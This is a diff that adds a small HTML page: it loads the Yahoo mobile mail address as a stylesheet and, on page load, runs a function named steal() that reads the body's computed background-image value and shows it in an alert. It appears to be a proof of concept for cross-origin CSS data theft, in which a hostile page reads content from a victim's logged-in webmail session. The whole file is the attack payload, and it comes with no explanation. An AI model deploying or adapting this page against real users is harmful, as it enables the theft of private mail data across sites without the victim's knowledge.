@@ -1,0 +1,19 @@
+<html>
+<head>
+<link rel="stylesheet"
+href="http://m.yahoo.com/mail">
+<script>
+function steal() {
+if(document.body.currentStyle) {
+alert(document.body.
+currentStyle["backgroundImage"]);
+} else {
+alert(getComputedStyle(document.body, "").
+backgroundImage);
+}
+}
+</script>
+</head>
+<body onload="steal()">
+</body>
+</html>
